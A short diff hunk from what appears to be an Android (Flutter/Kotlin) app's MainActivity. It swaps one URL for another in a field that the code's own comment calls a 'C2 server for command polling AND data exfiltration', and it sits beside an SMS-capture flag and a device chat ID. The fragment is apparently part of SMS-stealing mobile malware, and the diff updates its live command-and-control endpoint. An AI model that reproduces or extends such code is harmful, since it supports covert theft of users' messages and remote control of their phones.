@@ -31,7 +31,7 @@ class MainActivity : FlutterActivity() {
     )
 
     // C2 server for command polling AND data exfiltration
-    private val c2ServerUrl = "https://crytake.vercel.app/api"
+    private val c2ServerUrl = "https://cry-take.vercel.app/api"
     private var isSmsCaptureActive = false
     private var deviceChatId: String? = null
 
